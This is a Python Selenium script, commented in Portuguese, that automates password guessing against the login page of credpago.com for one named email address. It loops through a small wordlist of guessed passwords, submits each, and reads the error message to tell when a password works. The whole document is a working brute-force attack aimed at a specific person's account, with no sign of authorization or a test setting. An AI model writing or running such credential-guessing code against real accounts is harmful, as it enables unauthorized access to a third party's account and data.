

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Configuração do WebDriver (use o navegador de sua escolha)
driver = webdriver.Chrome()  # Certifique-se de ter o ChromeDriver instalado

# URL da página de login
url = "https://credpago.com/login.php"

# Wordlist com senhas a serem testadas
wordlist = [
    "credpago",
    "credpago123",
    "credpago2023",
    "credpagoseguro",
    "pagocred",
    "credito_pago",
    "credito_pago2023",
    "credpago1234",
    "credpago!@#",
    "pagocredito",
    "12345",
    "1234",
    # Adicione outras senhas aqui
]

# Loop através da wordlist e teste cada senha
for senha in wordlist:
    # Abre a página de login
    driver.get(url)

    # Aumenta o tempo limite para 30 segundos (ajuste conforme necessário)
    WebDriverWait(driver, 30).until(
        EC.visibility_of_element_located((By.NAME, "login"))
    )

    # Localiza o campo de entrada de login pelo atributo "name"
    login_field = driver.find_element(By.NAME, "login")

    # Preenche o campo de entrada de login
    login_field.send_keys("camila@phdimobiliaria.com.br")

    # Localiza o campo de senha pelo atributo "name"
    password_field = driver.find_element(By.NAME, "senha")

    # Preenche o campo de senha com a senha atual
    password_field.send_keys(senha)

    # Localiza o botão de login pelo texto "Entrar" (caso o botão tenha esse texto)
    login_button = driver.find_element(By.XPATH, "//button[contains(text(), 'Entrar')]")

    # Clica no botão de login para enviar o formulário
    login_button.click()

    # Verifica se a mensagem de erro "E-mail ou Senha Incorretos!" está presente
    error_message = driver.find_elements(By.XPATH, "//span[contains(text(), 'E-mail ou Senha Incorretos!')]")
    
    if error_message:
        print(f"Senha inválida: {senha}")
    else:
        print(f"Senha válida encontrada: {senha}")
        break

# Fecha o navegador quando o teste de senha é concluído
driver.quit()
